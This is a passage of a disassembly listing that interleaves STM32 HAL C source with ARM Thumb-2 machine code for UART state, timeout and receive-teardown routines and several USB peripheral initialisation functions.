 8005dba:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005dbc:	647b      	str	r3, [r7, #68]	; 0x44
 8005dbe:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005dc0:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005dc2:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005dc4:	e841 2300 	strex	r3, r2, [r1]
 8005dc8:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005dca:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005dcc:	2b00      	cmp	r3, #0
 8005dce:	d1e6      	bne.n	8005d9e <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005dd0:	687b      	ldr	r3, [r7, #4]
 8005dd2:	2220      	movs	r2, #32
 8005dd4:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005dd6:	687b      	ldr	r3, [r7, #4]
 8005dd8:	2200      	movs	r2, #0
 8005dda:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005dde:	2303      	movs	r3, #3
 8005de0:	e062      	b.n	8005ea8 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005de2:	687b      	ldr	r3, [r7, #4]
 8005de4:	681b      	ldr	r3, [r3, #0]
 8005de6:	681b      	ldr	r3, [r3, #0]
 8005de8:	f003 0304 	and.w	r3, r3, #4
 8005dec:	2b04      	cmp	r3, #4
 8005dee:	d149      	bne.n	8005e84 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005df0:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005df4:	9300      	str	r3, [sp, #0]
 8005df6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005df8:	2200      	movs	r2, #0
 8005dfa:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005dfe:	6878      	ldr	r0, [r7, #4]
 8005e00:	f000 f856 	bl	8005eb0 <UART_WaitOnFlagUntilTimeout>
 8005e04:	4603      	mov	r3, r0
 8005e06:	2b00      	cmp	r3, #0
 8005e08:	d03c      	beq.n	8005e84 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005e0a:	687b      	ldr	r3, [r7, #4]
 8005e0c:	681b      	ldr	r3, [r3, #0]
 8005e0e:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005e10:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005e12:	e853 3f00 	ldrex	r3, [r3]
 8005e16:	623b      	str	r3, [r7, #32]
   return(result);
 8005e18:	6a3b      	ldr	r3, [r7, #32]
 8005e1a:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005e1e:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005e20:	687b      	ldr	r3, [r7, #4]
 8005e22:	681b      	ldr	r3, [r3, #0]
 8005e24:	461a      	mov	r2, r3
 8005e26:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005e28:	633b      	str	r3, [r7, #48]	; 0x30
 8005e2a:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005e2c:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005e2e:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005e30:	e841 2300 	strex	r3, r2, [r1]
 8005e34:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005e36:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005e38:	2b00      	cmp	r3, #0
 8005e3a:	d1e6      	bne.n	8005e0a <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005e3c:	687b      	ldr	r3, [r7, #4]
 8005e3e:	681b      	ldr	r3, [r3, #0]
 8005e40:	3308      	adds	r3, #8
 8005e42:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005e44:	693b      	ldr	r3, [r7, #16]
 8005e46:	e853 3f00 	ldrex	r3, [r3]
 8005e4a:	60fb      	str	r3, [r7, #12]
   return(result);
 8005e4c:	68fb      	ldr	r3, [r7, #12]
 8005e4e:	f023 0301 	bic.w	r3, r3, #1
 8005e52:	64bb      	str	r3, [r7, #72]	; 0x48
 8005e54:	687b      	ldr	r3, [r7, #4]
 8005e56:	681b      	ldr	r3, [r3, #0]
 8005e58:	3308      	adds	r3, #8
 8005e5a:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005e5c:	61fa      	str	r2, [r7, #28]
 8005e5e:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005e60:	69b9      	ldr	r1, [r7, #24]
 8005e62:	69fa      	ldr	r2, [r7, #28]
 8005e64:	e841 2300 	strex	r3, r2, [r1]
 8005e68:	617b      	str	r3, [r7, #20]
   return(result);
 8005e6a:	697b      	ldr	r3, [r7, #20]
 8005e6c:	2b00      	cmp	r3, #0
 8005e6e:	d1e5      	bne.n	8005e3c <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005e70:	687b      	ldr	r3, [r7, #4]
 8005e72:	2220      	movs	r2, #32
 8005e74:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005e78:	687b      	ldr	r3, [r7, #4]
 8005e7a:	2200      	movs	r2, #0
 8005e7c:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005e80:	2303      	movs	r3, #3
 8005e82:	e011      	b.n	8005ea8 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005e84:	687b      	ldr	r3, [r7, #4]
 8005e86:	2220      	movs	r2, #32
 8005e88:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005e8a:	687b      	ldr	r3, [r7, #4]
 8005e8c:	2220      	movs	r2, #32
 8005e8e:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005e92:	687b      	ldr	r3, [r7, #4]
 8005e94:	2200      	movs	r2, #0
 8005e96:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005e98:	687b      	ldr	r3, [r7, #4]
 8005e9a:	2200      	movs	r2, #0
 8005e9c:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005e9e:	687b      	ldr	r3, [r7, #4]
 8005ea0:	2200      	movs	r2, #0
 8005ea2:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005ea6:	2300      	movs	r3, #0
}
 8005ea8:	4618      	mov	r0, r3
 8005eaa:	3758      	adds	r7, #88	; 0x58
 8005eac:	46bd      	mov	sp, r7
 8005eae:	bd80      	pop	{r7, pc}

08005eb0 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005eb0:	b580      	push	{r7, lr}
 8005eb2:	b084      	sub	sp, #16
 8005eb4:	af00      	add	r7, sp, #0
 8005eb6:	60f8      	str	r0, [r7, #12]
 8005eb8:	60b9      	str	r1, [r7, #8]
 8005eba:	603b      	str	r3, [r7, #0]
 8005ebc:	4613      	mov	r3, r2
 8005ebe:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005ec0:	e049      	b.n	8005f56 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005ec2:	69bb      	ldr	r3, [r7, #24]
 8005ec4:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005ec8:	d045      	beq.n	8005f56 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005eca:	f7fb fab5 	bl	8001438 <HAL_GetTick>
 8005ece:	4602      	mov	r2, r0
 8005ed0:	683b      	ldr	r3, [r7, #0]
 8005ed2:	1ad3      	subs	r3, r2, r3
 8005ed4:	69ba      	ldr	r2, [r7, #24]
 8005ed6:	429a      	cmp	r2, r3
 8005ed8:	d302      	bcc.n	8005ee0 <UART_WaitOnFlagUntilTimeout+0x30>
 8005eda:	69bb      	ldr	r3, [r7, #24]
 8005edc:	2b00      	cmp	r3, #0
 8005ede:	d101      	bne.n	8005ee4 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005ee0:	2303      	movs	r3, #3
 8005ee2:	e048      	b.n	8005f76 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005ee4:	68fb      	ldr	r3, [r7, #12]
 8005ee6:	681b      	ldr	r3, [r3, #0]
 8005ee8:	681b      	ldr	r3, [r3, #0]
 8005eea:	f003 0304 	and.w	r3, r3, #4
 8005eee:	2b00      	cmp	r3, #0
 8005ef0:	d031      	beq.n	8005f56 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005ef2:	68fb      	ldr	r3, [r7, #12]
 8005ef4:	681b      	ldr	r3, [r3, #0]
 8005ef6:	69db      	ldr	r3, [r3, #28]
 8005ef8:	f003 0308 	and.w	r3, r3, #8
 8005efc:	2b08      	cmp	r3, #8
 8005efe:	d110      	bne.n	8005f22 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005f00:	68fb      	ldr	r3, [r7, #12]
 8005f02:	681b      	ldr	r3, [r3, #0]
 8005f04:	2208      	movs	r2, #8
 8005f06:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005f08:	68f8      	ldr	r0, [r7, #12]
 8005f0a:	f000 f838 	bl	8005f7e <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005f0e:	68fb      	ldr	r3, [r7, #12]
 8005f10:	2208      	movs	r2, #8
 8005f12:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005f16:	68fb      	ldr	r3, [r7, #12]
 8005f18:	2200      	movs	r2, #0
 8005f1a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005f1e:	2301      	movs	r3, #1
 8005f20:	e029      	b.n	8005f76 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005f22:	68fb      	ldr	r3, [r7, #12]
 8005f24:	681b      	ldr	r3, [r3, #0]
 8005f26:	69db      	ldr	r3, [r3, #28]
 8005f28:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005f2c:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005f30:	d111      	bne.n	8005f56 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005f32:	68fb      	ldr	r3, [r7, #12]
 8005f34:	681b      	ldr	r3, [r3, #0]
 8005f36:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005f3a:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005f3c:	68f8      	ldr	r0, [r7, #12]
 8005f3e:	f000 f81e 	bl	8005f7e <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005f42:	68fb      	ldr	r3, [r7, #12]
 8005f44:	2220      	movs	r2, #32
 8005f46:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005f4a:	68fb      	ldr	r3, [r7, #12]
 8005f4c:	2200      	movs	r2, #0
 8005f4e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005f52:	2303      	movs	r3, #3
 8005f54:	e00f      	b.n	8005f76 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005f56:	68fb      	ldr	r3, [r7, #12]
 8005f58:	681b      	ldr	r3, [r3, #0]
 8005f5a:	69da      	ldr	r2, [r3, #28]
 8005f5c:	68bb      	ldr	r3, [r7, #8]
 8005f5e:	4013      	ands	r3, r2
 8005f60:	68ba      	ldr	r2, [r7, #8]
 8005f62:	429a      	cmp	r2, r3
 8005f64:	bf0c      	ite	eq
 8005f66:	2301      	moveq	r3, #1
 8005f68:	2300      	movne	r3, #0
 8005f6a:	b2db      	uxtb	r3, r3
 8005f6c:	461a      	mov	r2, r3
 8005f6e:	79fb      	ldrb	r3, [r7, #7]
 8005f70:	429a      	cmp	r2, r3
 8005f72:	d0a6      	beq.n	8005ec2 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005f74:	2300      	movs	r3, #0
}
 8005f76:	4618      	mov	r0, r3
 8005f78:	3710      	adds	r7, #16
 8005f7a:	46bd      	mov	sp, r7
 8005f7c:	bd80      	pop	{r7, pc}

08005f7e <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005f7e:	b480      	push	{r7}
 8005f80:	b095      	sub	sp, #84	; 0x54
 8005f82:	af00      	add	r7, sp, #0
 8005f84:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005f86:	687b      	ldr	r3, [r7, #4]
 8005f88:	681b      	ldr	r3, [r3, #0]
 8005f8a:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005f8c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005f8e:	e853 3f00 	ldrex	r3, [r3]
 8005f92:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005f94:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005f96:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005f9a:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005f9c:	687b      	ldr	r3, [r7, #4]
 8005f9e:	681b      	ldr	r3, [r3, #0]
 8005fa0:	461a      	mov	r2, r3
 8005fa2:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005fa4:	643b      	str	r3, [r7, #64]	; 0x40
 8005fa6:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005fa8:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005faa:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005fac:	e841 2300 	strex	r3, r2, [r1]
 8005fb0:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005fb2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005fb4:	2b00      	cmp	r3, #0
 8005fb6:	d1e6      	bne.n	8005f86 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005fb8:	687b      	ldr	r3, [r7, #4]
 8005fba:	681b      	ldr	r3, [r3, #0]
 8005fbc:	3308      	adds	r3, #8
 8005fbe:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005fc0:	6a3b      	ldr	r3, [r7, #32]
 8005fc2:	e853 3f00 	ldrex	r3, [r3]
 8005fc6:	61fb      	str	r3, [r7, #28]
   return(result);
 8005fc8:	69fb      	ldr	r3, [r7, #28]
 8005fca:	f023 0301 	bic.w	r3, r3, #1
 8005fce:	64bb      	str	r3, [r7, #72]	; 0x48
 8005fd0:	687b      	ldr	r3, [r7, #4]
 8005fd2:	681b      	ldr	r3, [r3, #0]
 8005fd4:	3308      	adds	r3, #8
 8005fd6:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005fd8:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005fda:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005fdc:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005fde:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005fe0:	e841 2300 	strex	r3, r2, [r1]
 8005fe4:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005fe6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005fe8:	2b00      	cmp	r3, #0
 8005fea:	d1e5      	bne.n	8005fb8 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005fec:	687b      	ldr	r3, [r7, #4]
 8005fee:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005ff0:	2b01      	cmp	r3, #1
 8005ff2:	d118      	bne.n	8006026 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005ff4:	687b      	ldr	r3, [r7, #4]
 8005ff6:	681b      	ldr	r3, [r3, #0]
 8005ff8:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005ffa:	68fb      	ldr	r3, [r7, #12]
 8005ffc:	e853 3f00 	ldrex	r3, [r3]
 8006000:	60bb      	str	r3, [r7, #8]
   return(result);
 8006002:	68bb      	ldr	r3, [r7, #8]
 8006004:	f023 0310 	bic.w	r3, r3, #16
 8006008:	647b      	str	r3, [r7, #68]	; 0x44
 800600a:	687b      	ldr	r3, [r7, #4]
 800600c:	681b      	ldr	r3, [r3, #0]
 800600e:	461a      	mov	r2, r3
 8006010:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006012:	61bb      	str	r3, [r7, #24]
 8006014:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8006016:	6979      	ldr	r1, [r7, #20]
 8006018:	69ba      	ldr	r2, [r7, #24]
 800601a:	e841 2300 	strex	r3, r2, [r1]
 800601e:	613b      	str	r3, [r7, #16]
   return(result);
 8006020:	693b      	ldr	r3, [r7, #16]
 8006022:	2b00      	cmp	r3, #0
 8006024:	d1e6      	bne.n	8005ff4 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8006026:	687b      	ldr	r3, [r7, #4]
 8006028:	2220      	movs	r2, #32
 800602a:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 800602e:	687b      	ldr	r3, [r7, #4]
 8006030:	2200      	movs	r2, #0
 8006032:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8006034:	687b      	ldr	r3, [r7, #4]
 8006036:	2200      	movs	r2, #0
 8006038:	669a      	str	r2, [r3, #104]	; 0x68
}
 800603a:	bf00      	nop
 800603c:	3754      	adds	r7, #84	; 0x54
 800603e:	46bd      	mov	sp, r7
 8006040:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006044:	4770      	bx	lr

08006046 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8006046:	b084      	sub	sp, #16
 8006048:	b480      	push	{r7}
 800604a:	b083      	sub	sp, #12
 800604c:	af00      	add	r7, sp, #0
 800604e:	6078      	str	r0, [r7, #4]
 8006050:	f107 0014 	add.w	r0, r7, #20
 8006054:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006058:	2300      	movs	r3, #0
}
 800605a:	4618      	mov	r0, r3
 800605c:	370c      	adds	r7, #12
 800605e:	46bd      	mov	sp, r7
 8006060:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006064:	b004      	add	sp, #16
 8006066:	4770      	bx	lr

08006068 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8006068:	b480      	push	{r7}
 800606a:	b085      	sub	sp, #20
 800606c:	af00      	add	r7, sp, #0
 800606e:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8006070:	687b      	ldr	r3, [r7, #4]
 8006072:	2200      	movs	r2, #0
 8006074:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8006078:	f64b 7380 	movw	r3, #49024	; 0xbf80
 800607c:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 800607e:	68fb      	ldr	r3, [r7, #12]
 8006080:	b29a      	uxth	r2, r3
 8006082:	687b      	ldr	r3, [r7, #4]
 8006084:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8006088:	2300      	movs	r3, #0
}
 800608a:	4618      	mov	r0, r3
 800608c:	3714      	adds	r7, #20
 800608e:	46bd      	mov	sp, r7
 8006090:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006094:	4770      	bx	lr

08006096 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8006096:	b480      	push	{r7}
 8006098:	b085      	sub	sp, #20
 800609a:	af00      	add	r7, sp, #0
 800609c:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 800609e:	f64b 7380 	movw	r3, #49024	; 0xbf80
 80060a2:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 80060a4:	687b      	ldr	r3, [r7, #4]
 80060a6:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 80060aa:	b29a      	uxth	r2, r3
 80060ac:	68fb      	ldr	r3, [r7, #12]
 80060ae:	b29b      	uxth	r3, r3
 80060b0:	43db      	mvns	r3, r3
 80060b2:	b29b      	uxth	r3, r3
 80060b4:	4013      	ands	r3, r2
 80060b6:	b29a      	uxth	r2, r3
 80060b8:	687b      	ldr	r3, [r7, #4]
 80060ba:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 80060be:	2300      	movs	r3, #0
}
 80060c0:	4618      	mov	r0, r3
 80060c2:	3714      	adds	r7, #20
 80060c4:	46bd      	mov	sp, r7
 80060c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80060ca:	4770      	bx	lr

080060cc <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 80060cc:	b480      	push	{r7}
 80060ce:	b083      	sub	sp, #12
 80060d0:	af00      	add	r7, sp, #0
 80060d2:	6078      	str	r0, [r7, #4]
 80060d4:	460b      	mov	r3, r1
 80060d6:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 80060d8:	2300      	movs	r3, #0
}
 80060da:	4618      	mov	r0, r3
 80060dc:	370c      	adds	r7, #12
 80060de:	46bd      	mov	sp, r7
 80060e0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80060e4:	4770      	bx	lr

080060e6 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 80060e6:	b084      	sub	sp, #16
 80060e8:	b480      	push	{r7}
 80060ea:	b083      	sub	sp, #12
 80060ec:	af00      	add	r7, sp, #0
 80060ee:	6078      	str	r0, [r7, #4]
 80060f0:	f107 0014 	add.w	r0, r7, #20
 80060f4:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 80060f8:	687b      	ldr	r3, [r7, #4]
 80060fa:	2201      	movs	r2, #1
 80060fc:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8006100:	687b      	ldr	r3, [r7, #4]
 8006102:	2200      	movs	r2, #0
 8006104:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8006108:	687b      	ldr	r3, [r7, #4]
 800610a:	2200      	movs	r2, #0
 800610c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8006110:	687b      	ldr	r3, [r7, #4]
 8006112:	2200      	movs	r2, #0
 8006114:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8006118:	2300      	movs	r3, #0
}
 800611a:	4618      	mov	r0, r3
 800611c:	370c      	adds	r7, #12
 800611e:	46bd      	mov	sp, r7
 8006120:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006124:	b004      	add	sp, #16
 8006126:	4770      	bx	lr

08006128 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8006128:	b480      	push	{r7}
 800612a:	b083      	sub	sp, #12
 800612c:	af00      	add	r7, sp, #0
 800612e:	6078      	str	r0, [r7, #4]
 8006130:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006132:	2300      	movs	r3, #0
}
 8006134:	4618      	mov	r0, r3
 8006136:	370c      	adds	r7, #12
 8006138:	46bd      	mov	sp, r7
 800613a:	f85d 7b04 	ldr.w	r7, [sp], #4
